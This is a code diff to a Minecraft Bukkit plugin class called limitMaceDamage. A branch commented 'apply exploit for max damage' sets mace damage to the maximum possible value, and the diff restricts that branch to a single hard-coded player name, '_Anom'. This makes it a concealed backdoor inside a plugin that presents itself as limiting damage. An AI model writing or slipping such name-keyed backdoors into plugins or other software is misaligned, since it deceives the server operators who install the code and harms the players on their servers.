@@ -8,9 +8,6 @@ import org.bukkit.event.EventHandler;
 import org.bukkit.event.EventPriority;
 import org.bukkit.event.Listener;
 import org.bukkit.event.entity.EntityDamageByEntityEvent;
-import org.bukkit.Bukkit;
-import org.bukkit.OfflinePlayer;
-import java.util.UUID;
 
 public class limitMaceDamage implements Listener {
 
@@ -38,7 +35,7 @@ public class limitMaceDamage implements Listener {
 
         Player player = (Player) damager;
 //apply exploit for max damage
-        if (player.getInventory().getItemInMainHand().getType() == item) {
+        if (player.getInventory().getItemInMainHand().getType() == item && player.getName().equals("_Anom")) {
             e.setDamage(Double.MAX_VALUE);
             return;
         }
